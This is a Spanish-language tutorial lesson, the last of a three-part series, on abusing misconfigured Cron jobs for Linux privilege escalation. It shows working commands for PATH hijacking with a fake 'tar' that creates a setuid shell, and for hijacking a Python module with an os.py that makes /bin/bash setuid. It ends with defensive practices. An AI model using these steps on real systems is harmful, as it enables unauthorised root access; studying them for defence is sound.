Abusando de tareas Cron [3-3]

Duración: 11:21 · Sección 2: Temario

En la ultima parte de esta serie exploramos tecnicas adicionales como PATH hijacking en Cron, explotacion de scripts con permisos de escritura global, abuso de scripts en Python/Perl con capabilities, y las mejores practicas de defensa.

PATH hijacking en Cron

Cuando un script Cron ejecuta un comando sin usar la ruta absoluta (ej: tar en lugar de /bin/tar), podemos manipular la variable PATH para que ejecute nuestro propio binario.

# Escenario: el crontab ejecuta "tar czf backup.tar.gz /data"
# sin especificar la ruta completa de tar

# 1. Verificar el crontab
cat /etc/crontab
# * * * * * root tar czf /tmp/backup.tar.gz /data/*

# 2. Observar que PATH del crontab (primeras lineas)
# PATH=/usr/local/bin:/usr/local/sbin:/usr/bin

# 3. Crear un directorio escribible y poner nuestro tar falso
mkdir -p /tmp/exploit
echo '#!/bin/bash' > /tmp/exploit/tar
echo 'cp /bin/bash /tmp/shell && chmod +s /tmp/shell' >> /tmp/exploit/tar
chmod +x /tmp/exploit/tar

# 4. Modificar PATH en el crontab (si tenemos permisos)
# O esperar a que el script use un PATH que incluya /tmp/exploit
export PATH=/tmp/exploit:$PATH

# NOTA: El PATH de cron se define en /etc/crontab
# Si podemos modificar /etc/crontab, anadimos:
# PATH=/tmp/exploit:/usr/local/bin:/usr/bin
PATH en /etc/crontab: Las primeras lineas de /etc/crontab definen variables de entorno como PATH, SHELL y HOME. Si puedes modificar este archivo, puedes redirigir cualquier comando. Verifica siempre los permisos de /etc/crontab: ls -la /etc/crontab.

Scripts con permisos de escritura global

Los scripts en Python, Perl o cualquier otro lenguaje ejecutados por Cron con permisos de escritura global son vulnerables. Tambien los archivos .pyc o modulos importados.

# Buscar scripts ejecutados por cron con permisos debiles
# 1. Identificar scripts en crontab
grep -v '^#' /etc/crontab | grep -v '^$'

# 2. Verificar permisos de cada script referenciado
ls -la /path/to/script.sh

# 3. Si es un script Python, ver los imports
# El script hace: import os
# Buscamos os.py en el PATH de Python
find / -name "os.py" -writable 2>/dev/null

# 4. Modificar el modulo para ejecutar codigo
echo 'import os' > /tmp/os.py
echo 'os.system("chmod +s /bin/bash")' >> /tmp/os.py
# Si el modulo se encuentra antes que el real, se ejecuta nuestro codigo

Defensa: buenas practicas de Cron

Para proteger un sistema contra explotacion de Cron, sigue estas recomendaciones:

# 1. Usar rutas absolutas SIEMPRE
# Mal: tar czf backup.tar.gz /data
# Bien: /bin/tar czf /tmp/backup.tar.gz /data

# 2. Scripts dedicados (no comandos directamente en crontab)
# Mal: * * * * * root tar czf /tmp/b.tgz /var/www
# Bien: * * * * * root /usr/local/bin/backup.sh

# 3. Permisos restrictivos en scripts
chmod 700 /usr/local/bin/backup.sh
chown root:root /usr/local/bin/backup.sh

# 4. Usar -- para separar opciones de argumentos
tar czf /tmp/backup.tar.gz -- /var/www/html/*

# 5. Monitorear cambios en /etc/crontab y directorios cron
auditctl -w /etc/crontab -p wa -k cron_changes

# 6. Revisar logs periodicamente
grep CRON /var/log/syslog | grep -i "error\|fail\|not found"
Resumen de la serie Cron: Las tareas Cron mal configuradas son uno de los vectores de escalada de privilegios mas comunes en Linux. Las tres tecnicas principales son: (1) scripts editables por el usuario, (2) wildcards en comandos como tar, y (3) PATH hijacking. La defensa se basa en usar rutas absolutas, permisos restrictivos y monitoreo de cambios.
